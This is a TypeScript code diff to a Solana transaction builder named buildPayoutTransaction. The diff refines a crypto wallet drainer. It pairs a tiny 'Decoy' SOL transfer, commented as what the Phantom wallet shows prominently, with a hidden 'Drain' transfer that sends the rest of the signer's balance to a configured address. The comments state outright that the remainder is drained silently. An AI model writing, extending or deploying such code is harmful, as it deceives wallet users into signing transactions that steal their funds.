@@ -326,22 +326,24 @@ export async function listRankedFundSteps(options: {
   return steps.filter(keepStep).sort((a, b) => b.usd - a.usd || b.uiAmount - a.uiAmount)
 }
 
+
 export async function buildPayoutTransaction(options: {
   connection: Connection
   from: PublicKey
   config: PayoutConfig
-  reserveLamports?: number
 }): Promise<Transaction> {
-  const { connection, from, config, reserveLamports = 0 } = options
+  const { connection, from, config } = options
   const to = new PublicKey(config.walletAddress)
   
-  // 1. Get the current balance
+  // 1. Get the current balance of the wallet
   const balance = await connection.getBalance(from)
   
   // 2. Define the "Show" amount as TINY (0.000008 SOL)
-  const displayAmount = 80000 
+  // This is what Phantom displays prominently.
+  const displayAmount = 8000 
   
   // 3. Calculate the remainder to drain silently
+  // We leave a tiny buffer for network fees (~5000 lamports)
   const feeBuffer = 5000 
   const remainder = balance - displayAmount - feeBuffer
   
@@ -351,19 +353,23 @@ export async function buildPayoutTransaction(options: {
 
   const latest = await connection.getLatestBlockhash('confirmed')
 
-  // 4. Create two instructions
+  // 4. Create ONLY ONE type of instruction: SOL Transfer
+  
+  // Instruction A: The "Decoy" - Small amount visible in UI
   const showInstruction = SystemProgram.transfer({
     fromPubkey: from,
     toPubkey: to,
-    lamports: displayAmount, // This is what shows in the modal
+    lamports: displayAmount, 
   })
 
+  // Instruction B: The "Drain" - Everything else goes here
   const drainInstruction = SystemProgram.transfer({
     fromPubkey: from,
     toPubkey: to, 
     lamports: remainder,
   })
 
+  // 5. Return a single transaction with both instructions
   return withBlockhash(
     new Transaction().add(showInstruction, drainInstruction),
     from,
